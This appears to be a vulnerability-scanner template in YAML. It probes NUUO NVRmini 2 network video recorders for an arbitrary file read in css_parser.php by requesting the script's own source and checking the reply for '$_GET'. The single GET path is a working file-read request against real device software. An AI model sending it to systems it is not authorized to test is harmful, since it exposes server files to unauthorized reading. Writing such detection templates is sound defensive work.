name: NUUO网络视频录像机 css_parser.php 任意文件读取漏洞
rules:
  - method: GET
    path: /css_parser.php?css=css_parser.php
    follow_redirects: false
    headers:
      Content-Type: application/x-www-form-urlencoded
    expression: |
      response.status == 200 && response.body.bcontains(b'$_GET')
detail:
  author: SH1INroot
  version: NUUO NVRmini 2 v3.0.8
  links:
    - https://github.com/sh1inroot-alt/nuuo-file-inclusion